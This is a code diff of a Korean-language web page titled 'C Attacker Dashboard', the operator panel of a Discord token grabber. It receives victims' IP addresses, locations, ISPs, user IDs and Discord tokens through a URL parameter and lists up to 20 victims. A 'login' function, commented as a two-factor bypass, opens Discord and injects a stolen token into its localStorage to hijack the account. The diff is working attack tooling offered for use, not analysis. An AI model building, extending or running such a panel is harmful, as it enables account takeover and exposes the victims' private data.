@@ -2,159 +2,188 @@
 <html lang="ko">
 <head>
   <meta charset="UTF-8">
-  <title>Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>C Attacker Dashboard</title>
   <style>
-    body { background: #0b0b12; color: #eee; font-family: sans-serif; padding: 20px; }
-    table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-    th, td { border: 1px solid #333; padding: 8px; text-align: left; word-break: break-all; }
-    th { background: #1a1a2e; }
-    .btn { padding: 4px 10px; border: none; border-radius: 4px; cursor: pointer; }
-    .btn-login { background: #5865F2; color: #fff; }
-    .btn-del { background: #e74c3c; color: #fff; }
-    .empty { text-align: center; padding: 40px 0; color: #555; }
-    .footer { margin-top: 20px; color: #444; font-size: 12px; text-align: right; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI', sans-serif; }
+    body { background:#0b0b12; color:#eee; padding:20px; }
+    .container { max-width:1200px; margin:0 auto; }
+    h1 { color:#ff3b3b; border-bottom:2px solid #ff3b3b44; padding-bottom:10px; margin-bottom:20px; }
+    .status { background:#1a1a2e; padding:12px 18px; border-radius:10px; margin-bottom:20px; display:flex; justify-content:space-between; align-items:center; }
+    .panel { background:#14141f; border-radius:12px; padding:20px; overflow-x:auto; }
+    table { width:100%; border-collapse:collapse; font-size:13px; }
+    th { text-align:left; padding:10px 8px; background:#1f1f33; border-bottom:1px solid #333; }
+    td { padding:10px 8px; border-bottom:1px solid #222; word-break:break-all; }
+    .token-col { max-width:180px; font-family:monospace; font-size:12px; color:#aaf; }
+    .btn { padding:4px 10px; border:none; border-radius:4px; cursor:pointer; font-weight:600; font-size:12px; }
+    .btn-login { background:#5865F2; color:#fff; }
+    .btn-login:hover { background:#4752c4; }
+    .btn-del { background:#e74c3c; color:#fff; }
+    .btn-del:hover { background:#c0392b; }
+    .btn-clear { background:#333; color:#eee; padding:6px 14px; border-radius:6px; border:none; cursor:pointer; }
+    .btn-clear:hover { background:#444; }
+    .badge { background:#2a2a44; padding:4px 12px; border-radius:30px; font-size:12px; color:#aaa; }
+    .empty { text-align:center; padding:40px 0; color:#555; }
+    .footer { margin-top:20px; color:#444; font-size:12px; text-align:right; }
   </style>
 </head>
 <body>
-  <h1>📊 C Attacker</h1>
-  <div id="status">📡 수집된 로그: <span id="count">0</span> / 20</div>
-  <button onclick="clearAll()">🗑 전체 삭제</button>
-  <table>
-    <thead>
-      <tr>
-        <th>#</th>
-        <th>IP</th>
-        <th>위치</th>
-        <th>통신사</th>
-        <th>유저 ID</th>
-        <th>토큰</th>
-        <th>액션</th>
-      </tr>
-    </thead>
-    <tbody id="logBody">
-      <tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>
-    </tbody>
-  </table>
-  <div class="footer">C Attacker v1.0 · 최대 20명</div>
+<div class="container">
+  <h1>⚡ C Attacker</h1>
+  <div class="status">
+    <span>📡 수집된 로그: <span id="countDisplay">0</span> / 20</span>
+    <button class="btn-clear" onclick="clearAll()">🗑 전체 삭제</button>
+  </div>
+  <div class="panel">
+    <table>
+      <thead>
+        <tr>
+          <th>#</th>
+          <th>IP</th>
+          <th>위치</th>
+          <th>통신사</th>
+          <th>유저 ID</th>
+          <th>토큰</th>
+          <th>액션</th>
+        </tr>
+      </thead>
+      <tbody id="logTableBody">
+        <tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>
+      </tbody>
+    </table>
+  </div>
+  <div class="footer">C Attacker v4.0 · 최대 20명</div>
+</div>
 
-  <script>
-    // 데이터 저장소
-    let logs = JSON.parse(localStorage.getItem('attacker_logs')) || [];
-    const MAX = 20;
+<script>
+  // ===== 데이터 저장소 =====
+  let logs = JSON.parse(localStorage.getItem('attacker_logs')) || [];
+  const MAX = 20;
 
-    // 테이블 렌더링
-    function render() {
-      const tbody = document.getElementById('logBody');
-      document.getElementById('count').textContent = logs.length;
+  // ===== 렌더링 =====
+  function renderTable() {
+    const tbody = document.getElementById('logTableBody');
+    document.getElementById('countDisplay').textContent = logs.length;
 
-      if (logs.length === 0) {
-        tbody.innerHTML = `<tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>`;
-        return;
-      }
-
-      let html = '';
-      logs.forEach((log, i) => {
-        html += `
-          <tr>
-            <td>${i+1}</td>
-            <td>${log.ip || 'IP 없음'}</td>
-            <td>${log.city || ''} ${log.region || ''} ${log.country || ''}</td>
-            <td>${log.isp || '알 수 없음'}</td>
-            <td>${log.userId || '알 수 없음'}</td>
-            <td style="font-size:12px;max-width:200px;overflow:hidden;text-overflow:ellipsis;">${log.token || '토큰 없음'}</td>
-            <td>
-              <button class="btn btn-login" onclick="login('${log.token}')">🔓 로그인</button>
-              <button class="btn btn-del" onclick="del(${i})">✕</button>
-            </td>
-          </tr>
-        `;
-      });
-      tbody.innerHTML = html;
+    if (logs.length === 0) {
+      tbody.innerHTML = `<tr><td colspan="7" class="empty">아직 수집된 로그가 없습니다.</td></tr>`;
+      return;
     }
 
-    // 로그 추가 (무조건 저장)
-    function addLog(data) {
-      if (!data || (!data.ip && !data.token)) return false;
-      if (logs.length >= MAX) {
-        alert('최대 20명까지 저장 가능합니다.');
-        return false;
-      }
-      // 중복 체크
-      if (logs.some(l => l.ip === data.ip && l.token === data.token)) {
-        console.log('중복 로그 무시');
-        return false;
-      }
-      logs.push({
-        ip: data.ip || 'IP 없음',
-        city: data.city || '알 수 없음',
-        region: data.region || '알 수 없음',
-        country: data.country || '알 수 없음',
-        isp: data.isp || '알 수 없음',
-        lat: data.lat || '없음',
-        lon: data.lon || '없음',
-        token: data.token || '토큰 없음',
-        userId: data.userId || '알 수 없음'
-      });
-      localStorage.setItem('attacker_logs', JSON.stringify(logs));
-      render();
-      alert('✅ 로그가 저장되었습니다!');
-      return true;
-    }
-
-    // 삭제
-    function del(index) {
-      if (!confirm('삭제하시겠습니까?')) return;
-      logs.splice(index, 1);
-      localStorage.setItem('attacker_logs', JSON.stringify(logs));
-      render();
-    }
-
-    function clearAll() {
-      if (!confirm('모든 로그를 삭제하시겠습니까?')) return;
-      logs = [];
-      localStorage.setItem('attacker_logs', JSON.stringify(logs));
-      render();
-    }
-
-    // 로그인
-    function login(token) {
-      if (!token || token === '토큰 없음') {
-        alert('유효한 토큰이 아닙니다.');
-        return;
-      }
-      const win = window.open('https://discord.com/app', '_blank');
-      if (!win) {
-        alert('팝업 차단을 해제해주세요.');
-        return;
-      }
-      const script = `
-        localStorage.setItem('token', JSON.stringify("${token}"));
-        location.reload();
+    let html = '';
+    logs.forEach((log, i) => {
+      html += `
+        <tr>
+          <td>${i+1}</td>
+          <td>${log.ip || 'IP 없음'}</td>
+          <td>${log.city || ''} ${log.region || ''} ${log.country || ''}</td>
+          <td>${log.isp || '알 수 없음'}</td>
+          <td style="font-family:monospace;font-size:12px;">${log.userId || '알 수 없음'}</td>
+          <td class="token-col">${log.token || '토큰 없음'}</td>
+          <td>
+            <button class="btn btn-login" onclick="loginToken('${log.token}')">🔓 로그인</button>
+            <button class="btn btn-del" onclick="deleteLog(${i})">✕</button>
+          </td>
+        </tr>
       `;
-      setTimeout(() => {
-        try { win.eval(script); } catch(e) {}
-      }, 1500);
-      alert('✅ 로그인 시도 중...');
-    }
+    });
+    tbody.innerHTML = html;
+  }
 
-    // URL 파라미터 처리
-    (function init() {
-      const params = new URLSearchParams(window.location.search);
-      const logParam = params.get('log');
-      if (logParam) {
-        try {
-          const decoded = decodeURIComponent(logParam);
-          const data = Object.fromEntries(new URLSearchParams(decoded));
-          addLog(data);
-        } catch(e) {
-          alert('❌ 오류: ' + e.message);
-        }
+  // ===== 로그 추가 (무조건 저장) =====
+  function addLog(logData) {
+    if (!logData || (!logData.ip && !logData.token)) {
+      console.warn('⚠️ 저장할 데이터 없음', logData);
+      return false;
+    }
+    if (logs.length >= MAX) {
+      alert('⚠️ 최대 20명까지 저장 가능합니다.');
+      return false;
+    }
+    // 중복 체크 (IP+토큰)
+    if (logs.some(l => l.ip === logData.ip && l.token === logData.token)) {
+      console.warn('⚠️ 중복 로그 무시');
+      return false;
+    }
+    logs.push({
+      ip: logData.ip || 'IP 없음',
+      city: logData.city || '알 수 없음',
+      region: logData.region || '알 수 없음',
+      country: logData.country || '알 수 없음',
+      isp: logData.isp || '알 수 없음',
+      lat: logData.lat || '없음',
+      lon: logData.lon || '없음',
+      token: logData.token || '토큰 없음',
+      userId: logData.userId || '알 수 없음'
+    });
+    localStorage.setItem('attacker_logs', JSON.stringify(logs));
+    renderTable();
+    console.log('✅ 로그 저장 성공:', logs[logs.length-1]);
+    return true;
+  }
+
+  // ===== 삭제 =====
+  function deleteLog(index) {
+    if (!confirm('이 로그를 삭제하시겠습니까?')) return;
+    logs.splice(index, 1);
+    localStorage.setItem('attacker_logs', JSON.stringify(logs));
+    renderTable();
+  }
+
+  function clearAll() {
+    if (!confirm('모든 로그를 삭제하시겠습니까?')) return;
+    logs = [];
+    localStorage.setItem('attacker_logs', JSON.stringify(logs));
+    renderTable();
+  }
+
+  // ===== 로그인 (2FA 우회) =====
+  function loginToken(token) {
+    if (!token || token === '토큰 없음') {
+      alert('유효한 토큰이 아닙니다.');
+      return;
+    }
+    const win = window.open('https://discord.com/app', '_blank');
+    if (!win) {
+      alert('팝업 차단을 해제해주세요.');
+      return;
+    }
+    const script = `
+      localStorage.setItem('token', JSON.stringify("${token}"));
+      location.reload();
+    `;
+    setTimeout(() => {
+      try { win.eval(script); } catch(e) {
+        alert('로그인 실패. 콘솔에서 수동 실행:\n' + script);
+      }
+    }, 1500);
+    alert('✅ 로그인 시도 중...');
+  }
+
+  // ===== URL 파라미터로 데이터 수신 =====
+  (function init() {
+    const params = new URLSearchParams(window.location.search);
+    const logParam = params.get('log');
+    if (logParam) {
+      try {
+        const decoded = decodeURIComponent(logParam);
+        const data = Object.fromEntries(new URLSearchParams(decoded));
+        console.log('📥 수신된 데이터:', data);
+        addLog(data);
+        // URL 정리
         if (window.history && window.history.replaceState) {
           window.history.replaceState({}, document.title, window.location.pathname);
         }
+      } catch(e) {
+        console.error('❌ 파싱 오류:', e);
+        alert('❌ 데이터 처리 중 오류 발생: ' + e.message);
       }
-      render();
-    })();
-  </script>
+    }
+    renderTable();
+    console.log('✅ 대시보드 로드 완료. 현재 로그:', logs.length);
+  })();
+
+  window.addLog = addLog;
+</script>
 </body>
 </html>
